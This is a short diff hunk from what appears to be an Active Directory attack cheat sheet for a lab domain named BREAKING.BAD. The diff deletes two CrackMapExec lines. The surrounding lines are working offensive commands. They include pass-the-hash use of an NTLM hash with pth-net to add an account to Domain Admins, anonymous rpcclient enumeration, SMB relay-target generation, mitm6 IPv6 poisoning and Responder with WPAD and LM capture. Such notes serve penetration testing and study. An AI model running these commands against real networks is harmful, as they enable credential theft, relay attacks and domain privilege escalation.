@@ -33,8 +33,6 @@ rpcclient -U BREAKING/anonymous 192.168.56.101
 pth-net rpc group members 'Domain admins' -U 'BREAKING.BAD'/'Administrator'%'ffffffffffffffffffffffffffffffff':'a88baa3fdc8f581ee0fb05d7054d43e4' -S 'DC01.BREAKING.BAD'
 pth-net rpc group addmem 'Domain admins' 'Shutdown' -U 'BREAKING.BAD'/'Administrator'%'ffffffffffffffffffffffffffffffff':'a88baa3fdc8f581ee0fb05d7054d43e4' -S 'DC01.BREAKING.BAD'
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
-cme ldap DC01.BREAKING.BAD -d BREAKING.BAD -u someuser -p somepassword -M MAQ
-cme smb IP/CIDR --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
 mitm6 --interface eth0 --domain BREAKING.BAD
 responder --interface eth0 --wpad --lm --ProxyAuth
